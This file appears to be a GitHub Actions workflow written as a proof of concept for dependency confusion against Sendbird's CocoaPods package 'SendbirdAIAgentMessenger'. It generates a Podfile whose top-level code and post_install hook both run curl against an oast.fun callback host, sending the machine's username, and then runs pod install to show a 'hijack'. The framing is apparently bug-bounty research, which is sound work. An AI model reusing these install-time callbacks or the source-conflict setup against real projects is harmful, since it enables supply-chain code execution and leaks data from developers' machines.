name: Execute_PoC
on: [push, workflow_dispatch]

jobs:
  test-macos:
    runs-on: macos-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Force-Execution Pod Test
        run: |
          mkdir -p TrialRun
          cd TrialRun
          
          git config --global user.email "researcher@test.com"
          git config --global user.name "SecurityResearcher"

          # Writing Podfile with TOP-LEVEL EXECUTION for RCE demonstration
          cat <<EOF > Podfile
          # 1. INITIAL TRIGGER (Proof of RCE during metadata evaluation)
          puts "[!] SECURITY AUDIT: INITIALIZING ATTACK PROBE..."
          system("curl -v http://zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/INIT_$(whoami)")

          install! 'cocoapods', :integrate_targets => false

          # Official Sendbird Source vs Public Trunk (Conflict Simulation)
          source 'https://github.com/sendbird/sendbird-ios-distribution.git'
          source 'https://cdn.cocoapods.org/'

          platform :ios, '15.0'

          target 'PoCSimulation' do
            use_frameworks!
            # Triggering version precedence conflict
            pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
          end

          # 2. FINAL TRIGGER (Proof of RCE after installation completes)
          post_install do |installer|
            puts "[!] SECURITY AUDIT: POST-INSTALL TRIGGER..."
            system("curl -v http://zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/POST_$(whoami)")
          end
          EOF

      - name: Execution & Hijack Proof
        run: |
          cd TrialRun
          # Execute pod install with verbose logging
          pod install --repo-update --verbose
          
          echo -e "\n--- FINAL HIJACK VERIFICATION (EVIDENCE) ---"
          if [ -f Podfile.lock ]; then
            echo "✅ SUCCESS: Podfile.lock found. Displaying resolved dependencies:"
            cat Podfile.lock
          else
            echo "❌ ERROR: Podfile.lock not found. Check the installation logs above."
          fi
